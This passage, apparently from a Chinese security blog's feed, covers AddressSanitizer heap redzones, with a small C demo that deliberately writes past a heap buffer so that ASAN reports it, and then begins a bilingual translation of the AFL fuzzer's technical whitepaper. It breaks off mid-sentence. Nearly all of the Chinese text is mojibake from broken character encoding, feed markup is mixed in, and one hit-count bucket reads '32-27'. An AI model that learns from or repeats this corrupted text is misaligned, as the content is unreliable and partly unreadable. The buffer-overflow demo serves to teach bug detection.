‡è®°ã€‚ASANåŠ«æŒäº†mallocå’Œfreeï¼Œä¸ä½¿ç”¨ptmallocè¿›è¡Œå†…å­˜ç®¡ç†ï¼Œgdbè°ƒè¯•æ—¶å¯ä»¥æ˜æ˜¾çœ‹åˆ°å †åŒºåŸŸçš„ä¸åŒå¯»å¸¸ã€‚å †å—ä½¿ç”¨çš„åˆ†é…æ–¹å¼ï¼Œåè€ŒæåƒKernelæ‰€ä½¿ç”¨çš„slabæœºåˆ¶ï¼Œå³æ ¹æ®éœ€è¦çš„sizeç›´æ¥åˆ†é…å‡ ç§å›ºå®šå¤§å°çš„chunkã€‚</p><p>å‡è®¾æˆ‘ä»¬è°ƒç”¨<code>malloc(0x13)</code>ï¼Œå…¶å†…å­˜çš„æ•ˆæœå›¾å¦‚ä¸‹ï¼š</p><p><img src="/img/article/asan/v2-e52ecd469c349343f12e8db3d5cd45a8_720w.webp" alt="img"></p><blockquote><p>åŒä¸Šï¼Œä¾µåˆ </p></blockquote><p>å¯ä»¥çœ‹åˆ°ï¼ŒASANåœ¨æˆ‘ä»¬ç”³è¯·çš„åœ°å€ä¹‹å‰ï¼Œå¢åŠ äº†å›ºå®š16byteçš„redzoneï¼Œç„¶åä»¥16byteå¯¹é½ã€‚</p><p>éœ€æ³¨æ„çš„äº‹ï¼Œè¿™é‡Œåªæœ‰<strong>left redzone</strong>ï¼Œä¸”å–ä»£äº†ptmallocçš„0x10å¤§å°çš„<strong>chunk header</strong>ã€‚ä½†æ ¹æ®æˆ‘åœ¨æµ‹è¯•æ—¶å‘ç°ï¼Œå †ç©ºé—´çš„redzoneä¼¼ä¹åœ¨åˆå§‹åŒ–æ—¶ä¼šå…¨éƒ¨æ ‡è®°ä¸º<code>0xfa</code>ï¼Œå³<strong>Heap left redzone</strong>ã€‚ç„¶ååœ¨mallocæ—¶ï¼Œå°†ç”¨æˆ·ä½¿ç”¨ç©ºé—´å–æ¶ˆposionã€‚<strong>å› è€Œä¸‹ä¸ªchunkçš„left redzoneä¼šå……å½“ä¸Šä¸ªchunkçš„right redzoneï¼Œè€Œæœ€åä¸€ä¸ªchunkçš„right zoneåˆ™æ˜¯ç”±åˆå§‹åŒ–æ—¶è®¾å®šçš„redzoneè¿›è¡Œé™åˆ¶ã€‚</strong></p><p>æˆ‘ä½¿ç”¨çš„ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">13</span>);<br>    <span class="hljs-type">char</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>    p1[<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27;a&#x27;</span>; <span class="hljs-comment">//crash</span><br>    p1[<span class="hljs-number">13</span>] = <span class="hljs-string">&#x27;b&#x27;</span>; <span class="hljs-comment">//crash</span><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>å¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ°<a href="https://github.com/Loora1N/how2ASAN/tree/main/heap-buffer-overflow">how2ASAN&#x2F;heap-buffer-overflow at main Â· Loora1N&#x2F;how2ASAN (github.com)</a></p></blockquote><p>æŠ¥é”™çš„<strong>shadow memory</strong>ä¸ºä¸‹å›¾ï¼š</p><p><img src="/img/article/asan/image-20230829172316072.png" alt="image-20230829172316072"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€fuzzã€‘AFLç™½çš®ä¹¦ä¸­è‹±åŒè¯­ç‰ˆ</title>
    <link href="/2023/08/23/%E3%80%90fuzz%E3%80%91AFL%E7%99%BD%E7%9A%AE%E4%B9%A6%E4%B8%AD%E8%8B%B1%E5%8F%8C%E8%AF%AD%E7%89%88/"/>
    <url>/2023/08/23/%E3%80%90fuzz%E3%80%91AFL%E7%99%BD%E7%9A%AE%E4%B9%A6%E4%B8%AD%E8%8B%B1%E5%8F%8C%E8%AF%AD%E7%89%88/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>æœ€è¿‘æƒ³ç ”ç©¶ç ”ç©¶AFLæ•´ä½“å†…éƒ¨é€»è¾‘æºç ï¼Œé¢è¯•æ—¶ä¹Ÿé‡åˆ°äº†åŒæ ·çš„é—®é¢˜ï¼Œå†³å®šä»AFLç™½çš®ä¹¦å¼€å§‹çœ‹çœ‹ã€‚ç½‘ä¸Šæœ‰å¾ˆå¤šç¿»è¯‘ç‰ˆï¼Œä½†æ˜¯è¦ä¸å°±æ˜¯æ²¡å†™å®Œï¼Œè¦ä¸å°±æ˜¯æœºç¿»ç—•è¿¹å¤ªé‡ã€‚å†³å®šè‡ªå·±å®Œæˆè¿™ä¸ªä»»åŠ¡ï¼Œäº‰å–åœ¨ä¸€å‘¨å†…å®Œæˆå¤§éƒ¨åˆ†æ ¸å¿ƒæºç çš„åˆ†æã€‚åˆæƒ³åˆ°ä¹‹å‰çœ‹<a href="https://loora1n.github.io/2023/04/24/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0/">ç½‘ç»œåè®®æ ˆ</a>å’Œ<a href="https://loora1n.github.io/2022/11/29/%E3%80%90IO_FILE%E3%80%91%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E6%A6%82%E8%A7%88/">IO_FILE</a>æ—¶çš„å™©æ¢¦äº†ğŸ˜­ğŸ˜­ğŸ˜­</p></blockquote><p>æœ¬äººè‹±è¯­æ°´å¹³æœ‰é™ï¼Œå¦‚æœ‰é—®é¢˜å¯ä»¥æ–‡æœ«è¯„è®ºåŒºç›´æ¥æŒ‡å‡ºã€‚æˆ‘æƒ³åšä¸­è‹±åŒè¯­ç‰ˆä¹Ÿæ˜¯å°½é‡åœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢å¤§å®¶è¢«æˆ‘çš„è¹©è„šç¿»è¯‘å¸¦åã€‚</p><p>ç™½çš®ä¹¦çš„åŸæ–‡éƒ¨åˆ†æˆ‘éƒ½ä¼šä½¿ç”¨markdownçš„å¼•ç”¨è¯­æ³•ï¼Œå¦å¤–ï¼Œå…¨æ–‡ä½¿ç”¨AFLç®€å†™æ›¿ä»£American fuzzy lop.</p><blockquote><p>AFLç™½çš®ä¹¦åŸæ–‡ï¼š<a href="https://lcamtuf.coredump.cx/afl/technical_details.txt">lcamtuf.coredump.cx&#x2F;afl&#x2F;technical_details.txt</a></p><p>AFLé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/google/AFL">google&#x2F;AFL: american fuzzy lop - a security-oriented fuzzer (github.com)</a></p><p>æœ¬æ–‡ä¹Ÿéƒ¨åˆ†å‚è€ƒï¼š<a href="https://www.jianshu.com/p/cc7a486e5adb">ç¿»è¯‘afl-fuzzç™½çš®ä¹¦ - ç®€ä¹¦ (jianshu.com)</a></p></blockquote><h2 id="æ–‡æ¡£ä»‹ç»"><a href="#æ–‡æ¡£ä»‹ç»" class="headerlink" title="æ–‡æ¡£ä»‹ç»"></a>æ–‡æ¡£ä»‹ç»</h2><blockquote><p>This document provides a quick overview of the guts of American Fuzzy Lop. See README for the general instruction manual; and for a discussion of motivations and design goals behind AFL, see historical_notes.txt.</p></blockquote><p>æœ¬æ–‡æ¡£ä¸ºAFLçš„å†…éƒ¨ç»“æ„æä¾›äº†ä¸€ä¸ªç®€è¦çš„æ¦‚è¿°ã€‚é€šç”¨è¯´æ˜æ‰‹å†Œå¯ä»¥ç›´æ¥æŸ¥é˜…README]éƒ¨åˆ†ï¼Œå¦å¤–ï¼Œæœ‰å…³AFLèƒŒåçš„è®¾è®¡ç›®æ ‡å’ŒåŠ¨æœºå¯ä»¥å‚é˜…hisrotical_notes.txtã€‚</p><h2 id="0ï¼‰Design-statement-è®¾è®¡è¯´æ˜"><a href="#0ï¼‰Design-statement-è®¾è®¡è¯´æ˜" class="headerlink" title="0ï¼‰Design statement è®¾è®¡è¯´æ˜"></a>0ï¼‰Design statement è®¾è®¡è¯´æ˜</h2><blockquote><p>American Fuzzy Lop does its best not to focus on any singular principle of<br>operation and not be a proof-of-concept for any specific theory. The tool can<br>be thought of as a collection of hacks that have been tested in practice,<br>found to be surprisingly effective, and have been implemented in the simplest,<br>most robust way I could think of at the time</p></blockquote><p>AFLå°½åŠ›ä¸å…³æ³¨ä»»ä½•å•ä¸€æ“ä½œçš„åŸç†ï¼ŒåŒæ—¶ä¹Ÿä¸æ˜¯ä»»ä½•ç‰¹å®šç†è®ºçš„POCã€‚è¿™ä¸ªå·¥å…·å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªhackå·¥å…·çš„é›†åˆï¼Œè¿™äº›å·¥å…·åœ¨å®é™…çš„éªŒè¯æµ‹è¯•åœºæ™¯ä¸­éå¸¸æœ‰æ•ˆï¼Œå› æ­¤æˆ‘ç”¨äº†é‚£æ—¶æˆ‘èƒ½æƒ³åˆ°çš„æœ€ç®€æ´æœ€å…·é²æ£’æ€§çš„æ–¹å¼å®ç°è®¾è®¡äº†å®ƒã€‚</p><blockquote><p>Many of the resulting features are made possible thanks to the availability of<br>lightweight instrumentation that served as a foundation for the tool, but this<br>mechanism should be thought of merely as a means to an end. The only true<br>governing principles are speed, reliability, and ease of use</p></blockquote><p>è®¸å¤šåŠŸèƒ½èƒ½å¤Ÿå®ç°ï¼Œéƒ½æ˜¯å¤šäºäº†å°†è½»é‡åŒ–å·¥å…·çš„å¯ç”¨æ€§ä½œä¸ºè¯¥é¡¹ç›®çš„åŸºç¡€ï¼Œä½†æ˜¯è¿™ç§æœºåˆ¶åº”è¯¥ä»…ä»…è¢«è§†ä½œä¸ºäº†å®ç°è®¾è®¡ç›®çš„çš„ä¸€ç§æ‰‹æ®µã€‚æœ¬é¡¹ç›®çœŸæ­£çš„å”¯ä¸€çš„ç®¡ç†åŸåˆ™åº”æ˜¯é«˜æ•ˆæ€§ã€ç¨³å®šæ€§å’Œæ˜“ç”¨æ€§ã€‚</p><h2 id="1ï¼‰Coverage-measurements-è¦†ç›–ç‡æµ‹é‡"><a href="#1ï¼‰Coverage-measurements-è¦†ç›–ç‡æµ‹é‡" class="headerlink" title="1ï¼‰Coverage measurements è¦†ç›–ç‡æµ‹é‡"></a>1ï¼‰Coverage measurements è¦†ç›–ç‡æµ‹é‡</h2><blockquote><p>The instrumentation injected into compiled programs captures branch (edge)<br>coverage, along with coarse branch-taken hit counts. The code injected at<br>branch points is essentially equivalent to:</p></blockquote><p>é€šè¿‡å‘å·²ç¼–è¯‘ç¨‹åºæ³¨å…¥æ£€æµ‹ä»£ç æ¥æ•è·ä»£ç åˆ†æ”¯ï¼ˆæˆ–è¾¹ç¼˜ï¼‰çš„è¦†ç›–èŒƒå›´ï¼ŒåŒæ—¶ç²—ç•¥å¾—è®°å½•åˆ†æ”¯å‘½ä¸­è®¡æ•°ã€‚åœ¨åˆ†æ”¯ç‚¹æ³¨å…¥å¾—ä»£ç æœ¬è´¨ä¸Šç›¸å½“äºå¦‚ä¸‹ä¼ªä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;<br>shared_mem[cur_location ^ prev_location]++; <br>prev_location = cur_location &gt;&gt; <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><blockquote><p>The cur_location value is generated randomly to simplify the process of<br>linking complex projects and keep the XOR output distributed uniformly.</p></blockquote><ul><li>cur_location çš„å€¼æ˜¯éšæœºç”Ÿæˆçš„ï¼Œä»¥ç®€åŒ–é“¾æ¥å¤æ‚é¡¹ç›®çš„è¿‡ç¨‹å¹¶ä¿æŒ XOR è¾“å‡ºå‡åŒ€åˆ†å¸ƒã€‚</li></ul><blockquote><p>The shared_mem[] array is a 64 kB SHM region passed to the instrumented binary<br>by the caller. Every byte set in the output map can be thought of as a hit for<br>a particular (branch_src, branch_dst) tuple in the instrumented code.</p></blockquote><ul><li>Shared_mem[] æ•°ç»„æ˜¯ä¸€ä¸ª 64 kB SHM åŒºåŸŸï¼Œç”±è°ƒç”¨è€…ä¼ é€’ç»™å·²æ£€æµ‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚è¾“å‡ºæ˜ å°„ä¸­çš„æ¯ä¸ªå­—èŠ‚é›†éƒ½å¯ä»¥è¢«è®¤ä¸ºæ˜¯æ£€æµ‹ä»£ç ä¸­ç‰¹å®šï¼ˆbranch_srcï¼Œbranch_dstï¼‰å…ƒç»„çš„å‘½ä¸­ã€‚</li></ul><blockquote><p>The size of the map is chosen so that collisions are sporadic with almost all<br>of the intended targets, which usually sport between 2k and 10k discoverable<br>branch points:</p></blockquote><p>é€‰æ‹©è¿™ä¸ªå¤§å°çš„æ˜ å°„ï¼Œæ˜¯ä¸ºäº†ç»Ÿè®¡å‡ ä¹æ‰€æœ‰é¢„æµ‹çš„ç›®æ ‡çš„å°‘é‡ç¢°æ’ï¼Œè€Œè¿™äº›ç›®æ ‡é€šå¸¸æœ‰2Kåˆ°10Kä¸ªå¯è§çš„åˆ†æ”¯ç‚¹ï¼š</p><table><thead><tr><th align="center">Branch cnt</th><th align="center">Colliding tuples</th><th align="center">Example targets</th></tr></thead><tbody><tr><td align="center">1,000</td><td align="center">0.75%</td><td align="center">giflib, lzo</td></tr><tr><td align="center">2,000</td><td align="center">1.5%</td><td align="center">zlib, tar, xz</td></tr><tr><td align="center">5,000</td><td align="center">3.5%</td><td align="center">libpng, libwebp</td></tr><tr><td align="center">10,000</td><td align="center">7%</td><td align="center">libxml</td></tr><tr><td align="center">20,000</td><td align="center">14%</td><td align="center">sqlite</td></tr><tr><td align="center">50,000</td><td align="center">30%</td><td align="center">-</td></tr></tbody></table><blockquote><p>At the same time, its size is small enough to allow the map to be analyzed<br>in a matter of microseconds on the receiving end, and to effortlessly fit<br>within L2 cache.</p></blockquote><p>åŒæ—¶ï¼Œç”±äºä»–çš„sizeè¶³å¤Ÿçš„å°ï¼Œå¾—ä»¥å…è®¸æ¥æ”¶ç«¯å¯ä»¥åœ¨å‡ å¾®ç§’çš„æ—¶é—´å†…åˆ†ææ˜ å°„ï¼Œå¹¶å°†å…¶æ”¾å…¥äºŒçº§ç¼“å­˜ä¸­ã€‚</p><blockquote><p>This form of coverage provides considerably more insight into the execution<br>path of the program than simple block coverage. In particular, it trivially<br>distinguishes between the following execution traces:</p></blockquote><p>ä¸ç®€å•çš„å—è¦†ç›–ç›¸æ¯”ï¼Œè¿™ç§å½¢å¼çš„è¦†ç›–å¯ä»¥æ›´æ·±å…¥åœ°äº†è§£ç¨‹åºçš„æ‰§è¡Œè·¯å¾„ã€‚ç‰¹åˆ«æ˜¯å®ƒå¯ä»¥è½»æ˜“åœ°åŒºåˆ†ä»¥ä¸‹æ‰§è¡Œæµç¨‹:</p><ul><li>A -&gt; B -&gt; C -&gt; D -&gt; E (tuples: AB, BC, CD, DE)</li><li>A -&gt; B -&gt; D -&gt; C -&gt; E (tuples: AB, BD, DC, CE)</li></ul><blockquote><p>This aids the discovery of subtle fault conditions in the underlying code,<br>because security vulnerabilities are more often associated with unexpected<br>or incorrect state transitions than with merely reaching a new basic block.</p></blockquote><p>è¿™æœ‰åŠ©äºå‘ç°åº•å±‚ä»£ç ä¸­çš„å¾®å¦™æ•…éšœæƒ…å†µï¼Œå› ä¸ºå®‰å…¨æ¼æ´é€šå¸¸ä¸æ„å¤–æˆ–ä¸æ­£ç¡®çš„çŠ¶æ€è½¬æ¢ç›¸å…³ï¼Œè€Œä¸æ˜¯ä»…ä»…ä¸åˆ°è¾¾æ–°çš„åŸºæœ¬å—ç›¸å…³ã€‚</p><blockquote><p>The reason for the shift operation in the last line of the pseudocode shown<br>earlier in this section is to preserve the directionality of tuples (without<br>this, A ^ B would be indistinguishable from B ^ A) and to retain the identity<br>of tight loops (otherwise, A ^ A would be obviously equal to B ^ B).</p></blockquote><p>æœ¬èŠ‚å‰é¢æ‰€ç¤ºçš„ä¼ªä»£ç æœ€åä¸€è¡Œä¸­è¿›è¡Œç§»ä½æ“ä½œçš„åŸå› æ˜¯ä¸ºäº†ä¿ç•™å…ƒç»„çš„æ–¹å‘æ€§ï¼ˆæ²¡æœ‰è¿™ä¸ªï¼ŒA ^ B å°†ä¸ B ^ A æ— æ³•åŒºåˆ†ï¼‰å¹¶ä¿ç•™ç´§å¯†å¾ªç¯çš„æ ‡è¯†ï¼ˆå¦åˆ™, A ^ A æ˜¾ç„¶ç­‰äº B ^ B)ã€‚</p><p><em><del>é¢˜å¤–è¯ï¼Œæˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¤§å®¶éƒ½å–œæ¬¢æŠŠè¿™ä¸ªåœ°æ–¹çš„ç§»ä½ç¿»è¯‘æˆå·¦ç§»ï¼Œä¸è®ºæ˜¯ç¿»è¯‘è¿˜æ˜¯ä»£ç å±‚é¢éƒ½ä¸åº”è¯¥å‡ºç°è¿™ç§é”™è¯¯å§</del></em></p><blockquote><p>The absence of simple saturating arithmetic opcodes on Intel CPUs means that<br>the hit counters can sometimes wrap around to zero. Since this is a fairly<br>unlikely and localized event, itâ€™s seen as an acceptable performance trade-off.</p></blockquote><p>è‹±ç‰¹å°” CPU ä¸Šç¼ºä¹ç®€å•çš„é¥±å’Œç®—æœ¯æ“ä½œç ï¼Œè¿™æ„å‘³ç€å‘½ä¸­è®¡æ•°å™¨æœ‰æ—¶ä¼šå›æ»šåˆ°é›¶ã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªç›¸å½“ä¸å¯èƒ½å‘ç”Ÿçš„å±€éƒ¨äº‹ä»¶ï¼Œå› æ­¤å®ƒè¢«è§†ä¸ºå¯æ¥å—çš„æ€§èƒ½æƒè¡¡ã€‚</p><h2 id="2ï¼‰Detecting-new-behaviors-æ£€æµ‹æ–°è¡Œä¸º"><a href="#2ï¼‰Detecting-new-behaviors-æ£€æµ‹æ–°è¡Œä¸º" class="headerlink" title="2ï¼‰Detecting new behaviors æ£€æµ‹æ–°è¡Œä¸º"></a>2ï¼‰Detecting new behaviors æ£€æµ‹æ–°è¡Œä¸º</h2><blockquote><p>The fuzzer maintains a global map of tuples seen in previous executions; this<br>data can be rapidly compared with individual traces and updated in just a couple<br>of dword- or qword-wide instructions and a simple loop.</p></blockquote><p>æ¨¡ç³Šå™¨ç»´æŠ¤å…ˆå‰æ‰§è¡Œä¸­çœ‹åˆ°çš„å…ƒç»„çš„å…¨å±€æ˜ å°„ï¼›è¯¥æ•°æ®å¯ä»¥å¿«é€Ÿä¸å•ç‹¬çš„è¿¹çº¿è¿›è¡Œæ¯”è¾ƒï¼Œå¹¶åªéœ€å‡ ä¸ªdwordæˆ–qwordçš„æŒ‡ä»¤å’Œä¸€ä¸ªç®€å•çš„å¾ªç¯å³å¯æ›´æ–°ã€‚</p><blockquote><p>When a mutated input produces an execution trace containing new tuples, the<br>corresponding input file is preserved and routed for additional processing<br>later on (see section #3). Inputs that do not trigger new local-scale state<br>transitions in the execution trace (i.e., produce no new tuples) are discarded,<br>even if their overall control flow sequence is unique.</p></blockquote><p>å½“å˜å¼‚çš„è¾“å…¥äº§ç”ŸåŒ…å«æ–°å…ƒç»„çš„ç¨‹åºæ‰§è¡Œæµæ—¶ï¼Œç›¸åº”çš„è¾“å…¥æ–‡ä»¶å°†è¢«ä¿ç•™å¹¶ä»¥ä¾›ç¨åè¿›è¡Œå…¶ä»–å¤„ç†ï¼ˆè¯·å‚é˜…ç¬¬ #3 èŠ‚ï¼‰ã€‚åœ¨æ‰§è¡Œè·Ÿè¸ªä¸­ï¼Œä¸è§¦å‘æ–°çš„å±€éƒ¨è§„æ¨¡çŠ¶æ€è½¬æ¢ï¼ˆå³ä¸äº§ç”Ÿæ–°å…ƒç»„ï¼‰çš„è¾“å…¥å°†è¢«ä¸¢å¼ƒï¼Œå³ä½¿å®ƒä»¬çš„æ€»ä½“æ§åˆ¶æµåºåˆ—æ˜¯å”¯ä¸€çš„</p><blockquote><p>This approach allows for a very fine-grained and long-term exploration of<br>program state while not having to perform any computationally intensive and<br>fragile global comparisons of complex execution traces, and while avoiding the<br>scourge of path explosion.</p></blockquote><p>è¿™ç§æ–¹æ³•å…è®¸å¯¹ç¨‹åºçŠ¶æ€è¿›è¡Œéå¸¸ç»†ç²’åº¦å’Œé•¿æœŸçš„æ¢ç´¢ï¼Œè€Œä¸å¿…å¯¹å¤æ‚çš„æ‰§è¡Œè·Ÿè¸ªæ‰§è¡Œä»»ä½•è®¡ç®—å¯†é›†å‹å’Œè„†å¼±çš„å…¨å±€æ¯”è¾ƒï¼ŒåŒæ—¶é¿å…è·¯å¾„çˆ†ç‚¸çš„å±å®³ã€‚</p><blockquote><p>To illustrate the properties of the algorithm, consider that the second trace<br>shown below would be considered substantially new because of the presence of<br>new tuples (CA, AE):</p></blockquote><p>ä¸ºäº†è¯´æ˜è¯¥ç®—æ³•çš„å±æ€§ï¼Œè¯·è€ƒè™‘ç”±äºæ–°å…ƒç»„ï¼ˆCAã€AEï¼‰çš„å­˜åœ¨ï¼Œä¸‹é¢æ˜¾ç¤ºçš„ç¬¬äºŒæ¡è½¨è¿¹å°†è¢«è§†ä¸ºå®è´¨ä¸Šæ˜¯æ–°çš„ï¼š</p><ul><li>#1:A -&gt; B -&gt; C -&gt; D -&gt; E </li><li>#2:    A -&gt; B -&gt; C -&gt; A -&gt; E</li></ul><blockquote><p>At the same time, with #2 processed, the following pattern will not be seen<br>as unique, despite having a markedly different overall execution path:</p></blockquote><p>åŒæ—¶ï¼Œè‹¥ä¿å­˜#2è·¯å¾„åï¼Œå°½ç®¡ä¸‹é¢çš„ä¾‹å­æ•´ä½“æ‰§è¡Œè·¯å¾„æ˜æ˜¾ä¸åŒï¼Œä½†å°†ä¸ä¼šè¢«è§†ä¸ºä¸€ä¸ªæ–°çš„è·¯å¾„ï¼š</p><ul><li>#3:A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; D -&gt; E</li></ul><blockquote><p>In addition to detecting new tuples, the fuzzer also considers coarse tuple<br>hit counts. These are divided into several buckets:</p></blockquote><p>é™¤äº†æ£€æµ‹æ–°å…ƒç»„ä¹‹å¤–ï¼Œæ¨¡ç³Šå™¨è¿˜è€ƒè™‘ç²—å…ƒç»„å‘½ä¸­è®¡æ•°ã€‚è¿™äº›è¢«åˆ†ä¸ºå‡ ä¸ªbuckets:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span><span class="hljs-number">-7</span>, <span class="hljs-number">8</span><span class="hljs-number">-15</span>, <span class="hljs-number">16</span><span class="hljs-number">-31</span>, <span class="hljs-number">32</span><span class="hljs-number">-27</span>, <span class="hljs-number">128</span>+<br></code></pre></td></tr></table></figure><blockquote><p>To some extent, the number of buckets is an implementation artifact: it allows<br>an in-place mapping of an 8-bit counter generated by the instrumentation to<br>an 8-position bitmap relied on by the fuzzer executable to keep track of the<br>already-seen execution counts for each tuple.</p></blockquote><p>ä»æŸç§æ„ä¹‰ä¸Šè®²ï¼Œè¿™äº›bucketsçš„æ•°é‡æ˜¯ä¸€ç§æ‰§è¡Œå·¥å…·ï¼šå®ƒå…è®¸å°†ç”Ÿæˆçš„ 8 ä½è®¡æ•°å™¨å°±åœ°æ˜ å°„åˆ°fuzzeræ‰§è¡Œå™¨æ‰€ä¾èµ–çš„ 8 ä½ä½å›¾ï¼Œä»¥è·Ÿè¸ªå·²ç»çœ‹åˆ°çš„æ•°æ®æ¯ä¸ªå…ƒç»„çš„æ‰§è¡Œè®¡æ•°</p><blockquote><p>Changes within the range of a single bucket are ignored; transition from one<br>bucket to another is flagged as an interesting change in program control flow,<br>and is routed to the evolutionary process outlined in the section below.</p></blockquote><p>å•ä¸ªbucketèŒƒå›´å†…çš„å˜åŒ–ä¼šè¢«å¿½ç•¥æ‰ï¼›ç„¶è€Œå…ƒç»„ä»ä¸€ä¸ªbucketåˆ°å¦ä¸€ä¸ªbucketçš„è½¬æ¢ä¼šè¢«æ ‡è®°ä¸ºç¨‹åºæ§åˆ¶æµä¸­çš„ä¸€ä¸ªæœ‰è¶£çš„å˜åŒ–ï¼Œç„¶åä¼šè¢«ä¿å­˜ä¸‹æ¥ä¼ é€’è‡³ä¸‹ä¸€è½®çš„æ¼”åŒ–è¿‡ç¨‹ä¸­å»ã€‚</p><blockquote><p>The hit count behavior provides a way to distinguish between potentially<br>interesting control flow changes, such as a block of code being executed<br>twice when it was normally hit only once. At the same time, it is fairly<br>insensitive to empirically less notable changes, such as a loop going from<br>47 cycles to 48. The counters also provide some degree of â€œaccidentalâ€<br>immunity against tuple collisions in dense trace maps.</p></blockquote><p>å‘½ä¸­è®¡æ•°è¡Œä¸ºæä¾›äº†ä¸€ç§åŒºåˆ†æ½œåœ¨çš„æœ‰è¶£çš„æ§åˆ¶æµå˜æ¢çš„æ–¹æ³•ï¼Œä¾‹å¦‚ï¼Œé€šå¸¸åªå‘½ä¸­ä¸€æ¬¡çš„ä»£ç å—è¢«æ‰§è¡Œäº†ä¸¤æ¬¡ã€‚åŒæ—¶ï¼Œå®ƒå¯¹é€šå¸¸ç»éªŒä¸Šä¸å¤ªæ˜¾ç€çš„å˜åŒ–ç›¸å½“ä¸æ•æ„Ÿï¼Œä¾‹å¦‚ä» 47 ä¸ªå‘¨æœŸå˜ä¸º 48 ä¸ªå‘¨æœŸçš„å¾ªç¯ã€‚è®¡æ•°å™¨è¿˜æä¾›ä¸€å®šç¨‹åº¦çš„â€œæ„å¤–â€å…ç–«åŠ›ï¼Œé˜²æ­¢å¯†é›†æµæ˜ å°„ä¸­çš„å…ƒç»„ç¢°æ’</p><blockquote><p>The execution is policed fairly heavily through memory and execution time<br>limits; by default, the timeout is set at 5x the initially-calibrated<br>execution speed, rounded up to 20 ms. The aggressive timeouts are meant to<br>prevent dramatic fuzzer performance degradation by descending into tarpits<br>that, say, improve coverage by 1% while being 100x slower; we pragmatically<br>reject them and hope that the fuzzer will find a less expensive way to reach<br>the same code. Empirical testing strongly suggests that more generous time<br>limits are not worth the cost.</p></blockquote><p>é€šè¿‡å†…å­˜å’Œæ‰§è¡Œæ—¶é—´å¯¹æ‰§è¡Œè¿‡ç¨‹è¿›è¡Œç›¸å½“ä¸¥æ ¼çš„é™åˆ¶ï¼›é»˜è®¤æƒ…å†µä¸‹ï¼Œè¶…æ—¶è®¾ç½®ä¸ºåˆå§‹æ ¡å‡†æ‰§è¡Œé€Ÿåº¦çš„ 5 å€ï¼Œå¤§çº¦ä¸º 20 æ¯«ç§’ã€‚æ¿€è¿›çš„è¶…æ—¶é™åˆ¶æ˜¯ä¸ºäº†ï¼Œé˜²æ­¢æ¨¡ç³Šå™¨æ€§èƒ½å› é™·å…¥æŸç§â€é™·é˜±â€œè€Œæ€¥å‰§ä¸‹é™ï¼Œä¾‹å¦‚ï¼Œå°†è¦†ç›–ç‡æé«˜ 1%ï¼ŒåŒæ—¶é€Ÿåº¦æ…¢ 100 å€ï¼›æˆ‘ä»¬ä¸€å®šä¼šæ‹’ç»è¿™ç§æ–¹æ³•ï¼Œå¹¶å¸Œæœ›fuzzerèƒ½å¤Ÿæ‰¾åˆ°ä¸€ç§ä»£ä»·æ›´ä½çš„æ–¹å¼çš„æ–¹æ³•æ¥è¾¾åˆ°ç›¸åŒçš„ä»£ç å—ã€‚åŒæ—¶ï¼Œå®è¯æ£€éªŒä¹Ÿéå¸¸å¼ºçƒˆåœ°è¡¨æ˜ï¼Œæ›´å®½æ¾çš„æ—¶é—´é™åˆ¶æ˜¯ä¸å€¼å¾—çš„ã€‚</p><h2 id="3ï¼‰Evolving-the-input-queue-æ”¹è¿›è¾“å…¥é˜Ÿåˆ—"><a href="#3ï¼‰Evolving-the-input-queue-æ”¹è¿›è¾“å…¥é˜Ÿåˆ—" class="headerlink" title="3ï¼‰Evolving the input queue æ”¹è¿›è¾“å…¥é˜Ÿåˆ—"></a>3ï¼‰Evolving the input queue æ”¹è¿›è¾“å…¥é˜Ÿåˆ—</h2><blockquote><p>Mutated test cases that produced new state transitions within the program are<br>added to the input queue and used as a starting point for future rounds of<br>fuzzing. They supplement, but do not automatically replace, existing finds.</p></blockquote><p>åœ¨ç¨‹åºä¸­äº§ç”Ÿæ–°çŠ¶æ€è½¬æ¢çš„å˜å¼‚æµ‹è¯•ç”¨ä¾‹è¢«æ·»åŠ 